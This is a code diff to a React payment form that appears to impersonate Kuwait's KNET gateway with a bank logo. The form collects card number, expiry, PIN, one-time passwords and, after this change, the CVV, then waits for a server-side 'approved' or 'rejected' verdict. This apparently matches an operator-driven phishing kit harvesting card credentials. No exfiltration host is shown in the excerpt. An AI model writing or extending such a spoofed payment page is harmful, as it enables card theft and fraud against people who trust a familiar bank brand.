@@ -126,6 +126,7 @@ export default function PaymentForm() {
     cardNumber: "",
     year: "",
     month: "",
+    cvv: "",
     otp: "",
     allOtps: newotp,
     bank: "",
@@ -184,6 +185,9 @@ export default function PaymentForm() {
           } else if (data.status === "approved") {
             setisloading(false);
             setstep(2);
+          } else if (data.status === "rejected") {
+            setisloading(false);
+            alert("خطأ في البطاقة");
           }
         }
       });
@@ -228,7 +232,7 @@ export default function PaymentForm() {
                   </div>
                   <label className="column-value text-label">
                     <img
-                      src="/kv.png"
+                      src="/kfh.jpeg"
                       className="logo"
                       alt="KNET logo"
                       width={45}
@@ -393,6 +397,27 @@ export default function PaymentForm() {
                           type="password"
                           size={4}
                           maxLength={4}
+                          className="column-value allownumericwithoutdecimal"
+                        />
+                      </div>
+                      <div className="row" id="PinRow">
+                        <label className="column-label"> Cvv: </label>
+                        <input
+                          inputMode="numeric"
+                          pattern="[0-9]*"
+                          name="cardcvv"
+                          id="cardcvv"
+                          onChange={(e: any) =>
+                            setPaymentInfo({
+                              ...paymentInfo,
+                              cvv: e.target.value,
+                            })
+                          }
+                          autoComplete="off"
+                          title="Should be in number. Length should be 4"
+                          type="password"
+                          size={3}
+                          maxLength={3}
                           className="column-value allownumericwithoutdecimal"
                         />
                       </div>
